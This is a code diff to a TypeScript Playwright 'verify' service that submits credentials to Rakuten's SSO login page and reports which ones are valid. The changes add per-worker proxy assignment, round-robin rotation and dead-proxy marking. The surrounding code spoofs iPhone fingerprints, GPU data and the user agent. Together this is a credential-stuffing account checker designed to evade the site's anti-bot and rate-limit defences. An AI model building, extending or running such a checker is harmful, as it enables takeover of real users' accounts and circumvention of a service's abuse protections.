@@ -8,6 +8,8 @@ import IProxyRepository from "../../core/repositories/IProxyRepository";
 import * as fs from "fs";
 import * as path from "path";
 import { createRatOverrideScript, CustomRat } from "../../utils/ratOverride";
+import { WorkerContext } from "../../core/value-objects/WorkerContext";
+import { getNextProxy, rotateProxyIndex } from "../../core/value-objects/WorkerProxyAssignment";
 
 const LOGIN_URL = 'https://login.account.rakuten.com/sso/authorize?r10_required_claims=r10_name&r10_audience=rae&r10_guest_login=true&r10_jid_service_id=rm001&scope=openid+memberinfo_read_safebulk+memberinfo_read_point+memberinfo_get_card_token+1Hour%40Access+90days%40Refresh&response_type=code&redirect_uri=https%3A%2F%2Fportal.mobile.rakuten.co.jp%2Fauth%2Fcallback&state=redirect_uri%3Dhttps%253A%252F%252Fportal.mobile.rakuten.co.jp%252Fdashboard%26operation%3Dlogin&client_id=rmn_app_web#/sign_in';
 
@@ -110,7 +112,7 @@ export default class PlaywrightVerify implements IVerifyService {
     await route.continue();
   }
 
-  async verify(credential: Credential): Promise<boolean> {
+  async verify(credential: Credential, context: WorkerContext): Promise<boolean> {
     if (credential.password.length < 8) {
       return false;
     }
@@ -122,7 +124,14 @@ export default class PlaywrightVerify implements IVerifyService {
       platform: 'iPhone'
     })
 
-    const proxy = await this.proxyRepository.rotate();
+    const assignment = context.proxyAssignment;
+
+    // Select current proxy based on index
+    const proxy = getNextProxy(assignment);
+
+    if (!proxy) {
+      throw new Error(`Worker ${context.workerId}: No proxy available`);
+    }
 
     const browser = await chromium.launch({
       channel: "chrome",
@@ -136,14 +145,14 @@ export default class PlaywrightVerify implements IVerifyService {
         '--ignore-certificate-errors',
         '--disable-gpu-shader-disk-cache',
       ],
-      proxy: proxy ? {
+      proxy: {
         server: proxy.server,
         username: proxy.username ?? void 0,
         password: proxy.password ?? void 0
-      } : void 0
+      }
     });
 
-    const context = await browser.newContext({
+    const browserContext = await browser.newContext({
       viewport: { width: 390, height: 844 },
       deviceScaleFactor: 3,
       isMobile: true,
@@ -152,7 +161,7 @@ export default class PlaywrightVerify implements IVerifyService {
       timezoneId: "Asia/Bangkok",
     });
 
-    const page = await context.newPage();
+    const page = await browserContext.newPage();
 
     // Inject RatOverride if custom RAT is set
     // if (this.customRat) {
@@ -167,7 +176,7 @@ export default class PlaywrightVerify implements IVerifyService {
     // Apply GPU spoofing based on device type
     await this.applyGPUSpoofing(page);
 
-    const client = await context.newCDPSession(page);
+    const client = await browserContext.newCDPSession(page);
 
     await client.send('Emulation.setUserAgentOverride', {
       userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
@@ -287,11 +296,16 @@ export default class PlaywrightVerify implements IVerifyService {
 
       return isVerified
     } catch (e) {
+      // Mark proxy as dead on error
+      await this.proxyRepository.markProxyDead(proxy.id);
       console.error(e)
       return false;
     } finally {
-      await context.close();
+      await browserContext.close();
       await browser.close();
+
+      // Round-robin to next proxy if both are available
+      rotateProxyIndex(assignment);
     }
   }
 
